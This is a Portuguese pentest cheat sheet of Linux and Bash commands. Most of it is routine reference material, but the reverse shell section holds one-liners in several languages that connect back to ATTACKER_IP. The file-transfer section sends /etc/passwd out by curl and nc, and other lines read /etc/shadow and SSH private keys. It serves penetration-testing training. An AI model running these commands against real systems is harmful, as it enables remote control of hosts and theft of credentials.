# 🐧 Comandos Linux e Bash — guia de referência completo para pentest

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

> **Termos usados:** pentest significa teste de intrusão; exploit é código que explora uma vulnerabilidade; payload é a carga executada; listener é um processo à escuta. Pós-exploração refere-se às ações após o acesso inicial. Mantêm-se os nomes técnicos e os literais dos exemplos; a disponibilidade de módulos e opções depende da versão e da plataforma.

> **Notas sobre os exemplos:** aliases como `ll`, ferramentas de rede e a opção `nc -e` variam entre ambientes. Os exemplos Bash com vários `if ...; then` são fragmentos, não um único script completo: faltam os corpos e os respetivos `fi`. Na comparação de `/etc/passwd` com awk, o separador `:` precisa de ser considerado para interpretar corretamente o terceiro campo. O exemplo de descodificação URL com `xxd -r -p` não trata diretamente os sinais `%` da entrada indicada. Os exemplos são preservados; consulta a [documentação Bash](https://www.gnu.org/software/bash/manual/) para a sintaxe da shell.

---

## 📋 Índice

- [Navegação e ficheiros](#-navigation--files)
- [Enumeração do sistema](#-system-enumeration)
- [Enumeração de utilizadores](#-user-enumeration)
- [Comandos de rede](#-network-commands)
- [Pesquisa e análise de ficheiros](#-file-search--analysis)
- [Processamento de texto](#-text-processing)
- [Permissões e propriedade](#-permissions--ownership)
- [Gestão de processos](#-process-management)
- [Gestão de pacotes](#-package-management)
- [Scripts Bash](#-bash-scripting)
- [Reverse shells (ligações de shell iniciadas pelo alvo)](#-reverse-shells)
- [Transferências de ficheiros](#-file-transfers)
- [Comandos de uma linha](#-one-liners)

---

<a id="-navigation--files"></a>
## 📁 Navegação e ficheiros

### Navegação entre pastas

```bash
# Pasta atual
pwd

# Mudar de pasta
cd /path/to/dir
cd ..          # Pasta superior
cd ~           # Pasta pessoal
cd -           # Pasta anterior

# Listar ficheiros
ls
ls -la         # Formato longo, todos os ficheiros
ls -lah        # Tamanhos legíveis
ls -latr       # Ordenar por data, em ordem inversa
ll             # Alias de ls -la (na maioria das distribuições)
```

### Operações com ficheiros

```bash
# Criar ficheiros/pastas
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Criar pastas superiores

# Copiar
cp source dest
cp -r source_dir dest_dir  # Recursivo

# Mover/mudar o nome
mv source dest
mv oldname newname

# Eliminar
rm file
rm -r directory            # Recursivo
rm -rf directory           # Forçar, sem confirmação

# Ver ficheiros
cat file.txt
less file.txt              # Paginador
more file.txt
head -n 20 file.txt        # Primeiras 20 linhas
tail -n 20 file.txt        # Últimas 20 linhas
tail -f file.txt           # Acompanhar em tempo real
```

### Arquivos e compressão

```bash
# tar
tar -cvf archive.tar files/      # Criar
tar -xvf archive.tar             # Extrair
tar -czvf archive.tar.gz files/  # Criar com compressão gzip
tar -xzvf archive.tar.gz         # Extrair com descompressão gzip

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

<a id="-system-enumeration"></a>
## 🔍 Enumeração do sistema

### Informações do sistema

```bash
# Nome do sistema
hostname
hostname -I               # Endereços IP

# Sistema operativo/kernel
uname -a                  # Todas as informações
uname -r                  # Versão do kernel
cat /etc/os-release       # Informações do sistema operativo
cat /etc/issue            # Banner do sistema operativo
cat /proc/version         # Informações do kernel/compilador

# Arquitetura
arch
uname -m

# Hardware
lscpu                     # Informações do CPU
cat /proc/cpuinfo
free -h                   # Memória
df -h                     # Espaço em disco
lsblk                     # Dispositivos de blocos
```

### Ambiente

```bash
# Variáveis de ambiente
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Definir uma variável
export VAR="value"
VAR="value"
```

### Serviços em execução

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Verificar portas à escuta
ss -tulpn
netstat -tulpn
```

### Tarefas cron

```bash
# Crontab do utilizador
crontab -l

# Crontabs do sistema
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Observar tarefas cron (utilizar pspy)
./pspy64
```

### Pacotes instalados

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Procurar um pacote
dpkg -l | grep package
which binary
whereis binary
```

---

<a id="-user-enumeration"></a>
## 👤 Enumeração de utilizadores

### Utilizador atual

```bash
# Identificar o utilizador atual
whoami
id
id username

# Grupos
groups
groups username

# Privilégios
sudo -l                   # Permissões de sudo
cat /etc/sudoers          # Ficheiro sudoers (requer root)
```

### Todos os utilizadores

```bash
# Lista de utilizadores
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Utilizadores com shell
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Hashes de palavras-passe (requer root)
cat /etc/shadow

# Sessões iniciadas recentemente
last
lastlog
w
who
users
```

### Ficheiros relevantes

```bash
# Chaves SSH
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Histórico
cat ~/.bash_history
cat ~/.zsh_history
history

# Ficheiros de configuração
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

<a id="-network-commands"></a>
## 🌐 Comandos de rede

### Configuração de rede

```bash
# Endereço IP
ip a
ip addr show
ifconfig

# Rotas
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# Tabela ARP
arp -a
ip neigh
```

### Portas abertas e ligações

```bash
# Portas à escuta
ss -tulpn
ss -tlnp                  # Apenas TCP
netstat -tulpn
netstat -ano

# Ligações ativas
ss -tup
netstat -an | grep ESTABLISHED

# Procurar o processo associado a uma porta
lsof -i :80
fuser 80/tcp
```

### Testes de rede

```bash
# Ping
ping -c 4 host

# Traceroute
traceroute host
tracepath host

# Consulta DNS
host domain.com
dig domain.com
nslookup domain.com

# Verificar uma porta
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # Apenas cabeçalhos
curl -s http://host       # Silencioso
curl -k https://host      # Ignorar a verificação de certificados TLS
wget http://host/file
```

### Firewall

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

<a id="-file-search--analysis"></a>
## 🔎 Pesquisa e análise de ficheiros

### Comando find

```bash
# Procurar pelo nome
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Sem distinguir maiúsculas de minúsculas

# Procurar pelo tipo
find / -type f -name "*.conf"          # Ficheiros
find / -type d -name "backup"          # Pastas

# Procurar pelas permissões
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # Com permissão de escrita para todos

# Procurar pelo proprietário
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Procurar pelo tamanho
find / -size +100M 2>/dev/null         # Maior que 100MB
find / -size -1k 2>/dev/null           # Menor que 1KB

# Procurar pela data
find / -mtime -7 2>/dev/null           # Modificado nos últimos 7 dias
find / -atime +30 2>/dev/null          # Acedido há mais de 30 dias

# Procurar e executar
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

### Grep (pesquisa em ficheiros)

```bash
# Pesquisa básica
grep "pattern" file
grep -i "pattern" file                 # Sem distinguir maiúsculas de minúsculas
grep -r "pattern" /path/               # Recursivo
grep -rn "pattern" /path/              # Com números de linha

# Correspondência inversa
grep -v "pattern" file                 # Linhas que NÃO correspondem

# Contar correspondências
grep -c "pattern" file

# Mostrar contexto
grep -A 3 "pattern" file               # 3 linhas posteriores
grep -B 3 "pattern" file               # 3 linhas anteriores
grep -C 3 "pattern" file               # 3 linhas em redor

# Regex
grep -E "regex" file                   # Expressão regular alargada
egrep "regex" file

# Vários padrões
grep -E "pattern1|pattern2" file
```

### Locate e Which

```bash
# Locate (requer updatedb)
locate filename
updatedb                               # Atualizar a base de dados

# Which (localizar um binário)
which binary
whereis binary
type command
```

### Análise de ficheiros

```bash
# Tipo de ficheiro
file filename

# Cadeias de caracteres num binário
strings binary
strings binary | grep password

# Representação hexadecimal
xxd file
hexdump -C file

# Hash
md5sum file
sha256sum file
sha1sum file
```

---

<a id="-text-processing"></a>
## ✂️ Processamento de texto

### Cut

```bash
# Extrair por delimitador
cut -d: -f1 /etc/passwd                # Primeiro campo, delimitador :
cut -d: -f1,3 /etc/passwd              # Campos 1 e 3

# Extrair pela posição dos caracteres
cut -c1-10 file                        # Caracteres 1-10
```

### Awk

```bash
# Mostrar colunas
awk '{print $1}' file                  # Primeira coluna
awk '{print $1, $3}' file              # Colunas 1 e 3
awk -F: '{print $1}' /etc/passwd       # Delimitador personalizado

# Condições
awk '$3 > 1000' /etc/passwd            # Onde o campo 3 > 1000
awk '/pattern/ {print $1}' file        # Linhas correspondentes

# Variáveis incorporadas
awk '{print NR, $0}' file              # Números de linha
awk 'END {print NR}' file              # Total de linhas
```

### Sed

```bash
# Substituir
sed 's/old/new/' file                  # Primeira ocorrência
sed 's/old/new/g' file                 # Todas as ocorrências
sed -i 's/old/new/g' file              # Editar o próprio ficheiro

# Eliminar linhas
sed '/pattern/d' file                  # Eliminar linhas correspondentes
sed '5d' file                          # Eliminar a linha 5
sed '1,5d' file                        # Eliminar as linhas 1-5

# Mostrar linhas específicas
sed -n '5p' file                       # Mostrar a linha 5
sed -n '1,10p' file                    # Mostrar as linhas 1-10
```

### Sort e Uniq

```bash
# Ordenar
sort file
sort -r file                           # Ordem inversa
sort -n file                           # Numérico
sort -u file                           # Apenas valores únicos
sort -t: -k3 -n /etc/passwd            # Pelo campo 3

# Únicos
uniq file                              # Remover duplicados adjacentes
sort file | uniq                       # Remover todos os duplicados
uniq -c file                           # Contar ocorrências
sort file | uniq -c | sort -rn         # Contar e ordenar
```

### Outros comandos úteis

```bash
# Contagem de palavras
wc -l file                             # Linhas
wc -w file                             # Palavras
wc -c file                             # Bytes

# Formatação em colunas
column -t file                         # Organizar em tabela
column -s: -t /etc/passwd              # Separador personalizado

# tr (transformar caracteres)
echo "HELLO" | tr 'A-Z' 'a-z'          # Minúsculas
cat file | tr -d '\n'                  # Remover quebras de linha

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

<a id="-permissions--ownership"></a>
## 🔐 Permissões e propriedade

### Compreender as permissões

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Outros (r-x = 5)
│ │  └───── Grupo  (r-x = 5)
│ └──────── Dono   (rwx = 7)
└────────── Tipo de ficheiro (- = ficheiro, d = pasta)
```

### Chmod

```bash
# Numérico
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Simbólico
chmod +x file                          # Adicionar permissão de execução
chmod -w file                          # Remover permissão de escrita
chmod u+x file                         # Execução pelo proprietário
chmod g+w file                         # Escrita pelo grupo
chmod o-r file                         # Sem leitura para outros

# Recursivo
chmod -R 755 directory/
```

### Chown

```bash
# Mudar o proprietário
chown user file
chown user:group file
chown -R user:group directory/

# Mudar apenas o grupo
chgrp group file
```

### Permissões especiais

```bash
# SUID (Set User ID) — 4
chmod u+s file
chmod 4755 file

# SGID (Set Group ID) — 2
chmod g+s directory
chmod 2755 directory

# Sticky bit — 1
chmod +t directory
chmod 1755 directory

# Procurar SUID/SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

<a id="-process-management"></a>
## ⚙️ Gestão de processos

### Ver processos

```bash
# Listar processos
ps aux
ps -ef
ps aux | grep process_name

# Top (em tempo real)
top
htop                                   # Versão melhorada

# Árvore de processos
pstree
ps auxf
```

### Controlo de processos

```bash
# Segundo plano/primeiro plano
command &                              # Executar em segundo plano
Ctrl+Z                                 # Suspender
bg                                     # Retomar em segundo plano
fg                                     # Trazer para primeiro plano
jobs                                   # Listar tarefas

# Terminar um processo
kill PID
kill -9 PID                            # Terminar forçadamente
killall process_name
pkill process_name

# Nice (prioridade)
nice -n 10 command                     # Prioridade mais baixa
renice 10 -p PID
```

---

<a id="-package-management"></a>
## 📦 Gestão de pacotes

### Debian/Ubuntu (apt/dpkg)

```bash
# Atualizar
apt update
apt upgrade

# Instalar
apt install package
dpkg -i package.deb

# Remover
apt remove package
apt purge package                      # Remover com as configurações

# Pesquisar
apt search package
apt-cache search package

# Informações
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# Atualizar
yum update
dnf update

# Instalar
yum install package
dnf install package

# Remover
yum remove package

# Pesquisar
yum search package

# Informações
yum info package
rpm -qa | grep package
```

---

<a id="-bash-scripting"></a>
## 💻 Scripts Bash

### Fundamentos

```bash
#!/bin/bash

# Variáveis
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Substituição de comandos
DATE=$(date)
FILES=`ls -la`

# Ler a entrada
read -p "Enter name: " NAME
echo "Hello $NAME"
```

### Condições

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Comparações (cadeias de caracteres)
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Vazio
if [ -n "$str" ]; then                 # Não vazio

# Comparações (números)
if [ $num1 -eq $num2 ]; then           # Igual
if [ $num1 -ne $num2 ]; then           # Diferente
if [ $num1 -gt $num2 ]; then           # Maior que
if [ $num1 -lt $num2 ]; then           # Menor que

# Testes de ficheiros
if [ -e file ]; then                   # Existe
if [ -f file ]; then                   # É um ficheiro
if [ -d dir ]; then                    # É uma pasta
if [ -r file ]; then                   # Com permissão de leitura
if [ -w file ]; then                   # Com permissão de escrita
if [ -x file ]; then                   # Com permissão de execução
```

### Ciclos

```bash
# Ciclo for
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# Ciclo while
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# Ciclo for ao estilo de C
for ((i=0; i<10; i++)); do
    echo $i
done
```

### Funções

```bash
# Definir uma função
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# Chamar uma função
function_name arg1 arg2
```

### Exemplo de script

```bash
#!/bin/bash
# Analisador de portas

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

<a id="-reverse-shells"></a>
## 🔌 Reverse shells (ligações de shell iniciadas pelo alvo)

### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### Netcat

```bash
# nc com -e
nc -e /bin/bash ATTACKER_IP PORT

# nc sem -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Melhorar a shell

```bash
# Criar um TTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# TTY completo
# Na reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# No sistema atacante:
stty raw -echo; fg
# Na shell:
export TERM=xterm
stty rows 40 cols 150
```

---

<a id="-file-transfers"></a>
## ⬇️ Transferências de ficheiros

### Do atacante para o alvo

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Atacante: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 (para ficheiros pequenos)
# Atacante: base64 file
echo "BASE64_STRING" | base64 -d > file
```

### Do alvo para o atacante

```bash
# nc
# Atacante: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Copiar a saída para o atacante e descodificar
```

### Iniciar um servidor HTTP

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

<a id="-one-liners"></a>
## ⚡ Comandos de uma linha

### Comandos de uma linha úteis em testes de intrusão

```bash
# Procurar binários SUID
find / -perm -4000 -type f 2>/dev/null

# Procurar pastas com permissão de escrita
find / -writable -type d 2>/dev/null

# Procurar ficheiros com permissão de escrita para todos
find / -perm -o+w -type f 2>/dev/null

# Procurar ficheiros de configuração com palavras-passe
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# Procurar chaves SSH
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Análise rápida de portas
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Descoberta de sistemas por ping
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# Extrair IPs de um ficheiro
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Codificar/descodificar Base64
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# Codificar/descodificar URLs
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### Tabela de referência rápida

| Finalidade | Comando |
|---------|---------|
| Utilizador atual | `whoami` / `id` |
| Informações do sistema | `uname -a` |
| Endereço IP | `ip a` / `hostname -I` |
| Portas abertas | `ss -tulpn` |
| Processos em execução | `ps aux` |
| Procurar SUID | `find / -perm -4000 2>/dev/null` |
| Pastas com permissão de escrita | `find / -writable -type d 2>/dev/null` |
| Descarregar ficheiro | `wget http://url/file` |
| Reverse shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Melhorar o TTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

## 📚 Recursos

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Guia de referência de reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Guias de referência relacionados
- [Linux PrivEsc](../../Linux-PrivEsc/README.md)
- [Nmap](../../Nmap/README.md)
- [Metasploit](../../Metasploit/translations/README.pt.md)

---

<p align="center">
  <b>🐧 Domina o Linux para testes de intrusão!</b><br>
  <i>A linha de comandos é a tua melhor aliada</i>
</p>
